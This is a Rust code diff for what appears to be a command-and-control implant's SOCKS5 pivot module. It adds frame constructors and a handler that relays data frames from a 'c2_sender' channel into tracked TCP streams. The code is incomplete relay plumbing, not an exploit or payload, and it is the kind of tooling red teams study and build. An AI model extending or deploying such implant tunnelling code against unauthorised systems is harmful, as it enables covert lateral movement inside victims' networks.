@@ -1,6 +1,9 @@
 use tokio::net::TcpStream;
 use tokio::sync::mpsc;
 use std::collections::HashMap;
+use tokio::io::AsyncWriteExt;
+use std::sync::Arc;
+use tokio::sync::Mutex;
 
 #[derive(Debug)]
 pub enum PivotFrameType {
@@ -17,11 +20,38 @@ pub struct PivotFrame {
     pub payload: Vec<u8>,
 }
 
+
+// Implementing the PivotFrame struct
+impl PivotFrame {
+    pub fn open(stream_id: u32, addr: String) -> Self {
+        Self {
+            stream_id,
+            frame_type: PivotFrameType::Open,
+            payload: addr.into_bytes(),
+        }
+    }
+    pub fn data(stream_id: u32, data: Vec<u8>) -> Self {
+        Self {
+            stream_id,
+            frame_type: PivotFrameType::Data,
+            payload: data,
+        }
+    }
+    pub fn close(stream_id: u32) -> Self {
+        Self {
+            stream_id,
+            frame_type: PivotFrameType::Close,
+            payload: vec![],
+        }
+    }
+}
+
 pub struct Socks5PivotHandler {
-    streams: HashMap<u32, TcpStream>,
+    streams: HashMap<u32, Arc<Mutex<TcpStream>>>,
     c2_sender: mpsc::Sender<PivotFrame>,
 }
 
+// Implementing the Socks5PivotHandler struct
 impl Socks5PivotHandler {
     pub fn new(c2_sender: mpsc::Sender<PivotFrame>) -> Self {
         Self {
@@ -30,7 +60,26 @@ impl Socks5PivotHandler {
         }
     }
 
+    pub fn register_stream(&mut self, stream_id: u32, stream: Arc<Mutex<TcpStream>>) {
+        self.streams.insert(stream_id, stream);
+    }
+
     pub async fn handle_frame(&mut self, frame: PivotFrame) {
-        // Implement logic to open/close/relay data for streams
+        match frame.frame_type {
+            PivotFrameType::Data => {
+                if let Some(stream) = self.streams.get(&frame.stream_id) {
+                    let mut stream = stream.lock().await;
+                    log::debug!("[SOCKS5-PIVOT] Writing {} bytes to stream {}", frame.payload.len(), frame.stream_id);
+                    let _ = stream.write_all(&frame.payload).await;
+                } else {
+                    log::warn!("[SOCKS5-PIVOT] No stream found for stream_id {}", frame.stream_id);
+                }
+            }
+            PivotFrameType::Close => {
+                self.streams.remove(&frame.stream_id);
+                log::info!("[SOCKS5-PIVOT] Closing stream {}", frame.stream_id);
+            }
+            _ => {}
+        }
     }
 }
